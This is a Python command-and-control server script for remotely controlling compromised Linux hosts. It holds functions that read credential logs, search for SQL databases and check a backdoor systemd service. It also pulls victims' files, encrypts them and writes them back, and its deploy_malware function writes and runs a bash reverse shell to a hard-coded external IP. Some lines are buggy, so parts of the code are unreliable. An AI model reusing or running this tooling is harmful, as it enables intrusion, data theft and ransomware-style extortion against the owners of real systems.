import base64
import random
import cryptography.fernet as crypt
import subprocess,time,sys
from colorama import Fore
from random import choice
import socket
from dy import *
import gzip

def print_Connected_Clients(server, ALLOWED_AMOUNT_OF_CONNECTIONS):
    print(f"Loading {Fore.CYAN}Clients...{Fore.RESET} {ALLOWED_AMOUNT_OF_CONNECTIONS} {Fore.GREEN}Clients {Fore.GREEN}Allowed{Fore.RESET},{len(server.clients)} {Fore.GREEN}Connected{Fore.RESET}")
    print(f"{Fore.CYAN}C2 IP:{Fore.RESET} {Fore.GREEN}{server.host_ip}{Fore.RESET} | {Fore.CYAN}Server Port:{Fore.RESET} {Fore.GREEN}{server.host_port}{Fore.RESET}")

def welcome(server, ALLOWED_AMOUNT_OF_CONNECTIONS):
        welcome_msg = """
▀██▀▀█▄   ▀██▀ ▀█▀                   
 ██   ██    ██ █      ██        ███  
 ██    ██    ██      ███       ██ ██ 
 ██    ██    ██       ██       ██ ██ 
▄██▄▄▄█▀    ▄██▄      ██       ██ ██ 
                      ██   ██  ██ ██ 
                     ▀▀▀▀       ▀█▀     

        """ 
        hues = [random.randint(0, 255) for _ in range(0, 8)]
        
        for line in welcome_msg.split("\n"):
            for char in line:
                hue_code = choice(hues)  # Choose a random hue code from the defined hues
                colored_char = f"\033[38;5;{hue_code}m{char}{Fore.RESET}"
                print(colored_char, end="")
            print()
        print()
        # print the cwd
        print(Fore.CYAN + "Hosting Directory" + Fore.MAGENTA + ": " + Fore.RESET + Fore.GREEN + str(subprocess.getoutput('pwd')) + Fore.RESET)
        print_Connected_Clients(server, ALLOWED_AMOUNT_OF_CONNECTIONS)

def ask_for_execpath(execpath=None, default="/var/client.py"):
    # ask for the execpath
    if execpath is None:
        execpath = input("Enter the Execpath (default: %s): " % default)
    # if the execpath is empty, use the default
    if execpath == "":
        execpath = default
    # return the execpath
    return execpath

def Get_service(self):
    # get the service used to backdoor the system
    servicepath = "/etc/systemd/system/"
    service_exec = "rev_shell.service"
    service = servicepath + service_exec
    print("Getting service that got backdoored")
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # get the service
        client.send(b"cat " + service.encode())
        # receive the service
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print(f"Received data from Client: \n{recv_data}\n")

def display_clients(self):
    # send the list of clients to the server
    print("Connected Clients:")
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # get the location of client.py
        client.send(b"find / -name client.py")
        # receive the location of client.py
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print(f"Received data from Client: \n{recv_data}\n")

def get_open_ports(self):
    # send the list of clients to the server
    print("Getting open ports")
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # get the open ports
        client.send(b"ss -tulpn | grep LISTEN")
        # receive the open ports
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print("Received data from Client:", recv_data)
        
def get_auth_log(self):
    print("getting auth.log")
    path = "/var/log/auth.log"
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # get the location of client.py
        client.send(b"cat " + path.encode() + b" | grep 'Accepted'")
        # receive the open ports
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print("Received data from Client:", recv_data)

def sysinfo(self):
    command = None
    print("getting system info")
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # get the location of client.py
        client.send(b"uname -a")
        # receive the open ports
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print("Received data from Client:", recv_data)

def put_file(self, file):
    print("putting file")
    # compress the file when sending it, then decompress it on the client side
    compress = True
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # touch the file name to the client
        client.send(b"echo " + file.encode() + b" > " + file.encode())
        # write the data of that file to the client
        client.send(b"cat " + file.encode() + b" > " + file.encode())
        # check if it 
        # receive the open ports
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print("Received data from Client:", recv_data)
        compress = compress and recv_data.endswith(".gz")
    if compress:
        print("Compressing file")
        # compress the file
        compress_file(file)
        # send the compressed file
        self.send_file(file + ".gz")
        # remove the compressed file
        os.remove(file + ".gz")

def compress_file(file):
    # compress the file
    with open(file, "rb") as f:
        data = f.read()
    with gzip.open(file + ".gz", "wb") as f:
        f.write(data)

def search_for_mysql_database(self):
    print("searching for mysql databases")
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # get the location of client.py
        client.send(b"find / -name '*.sql'")
        # receive the open ports
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print("Received data from Client:", recv_data)

def get_file_then_encrpyt(self,file):
    """This is going to get the clients file, encrpyt it, then send it back to the client"""
    print("getting file")
    for i, (client, client_addr) in enumerate(self.clients):
        print("ID:", i+1, "- Address:", client_addr[0], " | Port:", client_addr[1] )
        # get the file from the client
        client.send('cat {}'.format(file).encode())
        # receive the data from the client
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        # encrypt the data
        encrypted_data = encrypt_data(recv_data.encode(), client_addr[0])
        # send the encrypted data back to the client
        client.send('echo "{}" > {}'.format(encrypted_data.decode(), file).encode() )
        # receive the data from the client
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print("Received data from Client:\n", recv_data, '\n')

def encrypt(file, ip_address):
    """This is going to encrypt the file"""
    print("encrypting file")
    # open the file and read the data
    with open(file, 'rb') as f:
        data = f.read()
    # encrypt the data
    encrypted_data = encrypt_data(data, ip_address)
    # write the encrypted data to the file
    with open(file, 'wb') as f:
        f.write(encrypted_data)

def encrypt_data(data, ip_address):
    """This is going to encrypt the data"""
    print("encrypting data")
    # create a key
    key = crypt.Fernet.generate_key()
    # save the key to the host machine corresponding to the ip
    random_key_name = random_key(ip_address)
    # create a fernet object
    f = crypt.Fernet(key)
    # encrypt the data
    encrypted_data = f.encrypt(data)
    # print the file name and key 
    print("File Name:", random_key_name)
    # return the encrypted data
    name_coorelation = random_key_name + ".key"
    with open(name_coorelation, 'wb') as f:
        # write the ip address and port to the file
        f.write(encrypted_data + b"\n\n")
        f.write(data + b"\n\n")
        f.write(key)
    return encrypted_data

def random_key(ip_address):
    # create a random key accordng to the ip address
    random_key_name = ip_address
    return random_key_name

def deploy_malware(self):
    # make hourglass animation
    for i in range(10):
        print("Deploying Malware" + "." * i)
        time.sleep(1)
        sys.stdout.write("\033[F")

    # send the list of clients to the server
    print("Building Malware")
    for i, (client, client_addr) in enumerate(self.clients):
        # touch a file
        client.send(b"touch skgj.sh\n")
        # since it is a reverse shell echo the command into the file
        client.send(b"echo '#!/bin/bash\nbash -i >& exec 3<>/dev/tcp/173.230.140.32/999; bash <&3 >&3\n' > skgj.sh\n")
        # make the file executable
        client.send(b"chmod +x skgj.sh\n")
        # run the file
        client.send(b"./skgj")
        # receive the data from the client
        recv_data = client.recv(8096).decode()
        # remove the trailing newline
        recv_data = recv_data.strip()
        print("Received data from Client:", recv_data)

def start_conn(self):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((self.host_ip, self.host_port))
    print("[*]: Server Initiated...")
    print("[*]: Listening to the Client")
    server.listen(ALLOWED_AMOUNT_OF_CONNECTIONS)
    try:
      print(f"{Fore.GREEN}[*]{Fore.RESET}: {Fore.RED}Called Init{Fore.RESET}")
      while len(self.clients) < ALLOWED_AMOUNT_OF_CONNECTIONS:
          client, client_addr = server.accept()
          self.clients.append((client, client_addr))
          print(f"{Fore.GREEN}[*]{Fore.RESET}: Received Connection from", client_addr)
      print(f"{Fore.GREEN}[*]: {Fore.GREEN}Finished Init")
    except Exception as e:
      print(f"Error {e}")  

def close_conn(self):
    for i in range(len(self.clients)):
        client, client_addr = self.clients[i]
        client.close()
    sys.exit(0)

def refresh_connection(self):
    # refresh the connection with the client
    print("refreshing connection")
    # close the connection
    self.close_conn()
    # start the script 
    subprocess.call(["python3", "dy.py", 0])
    









        
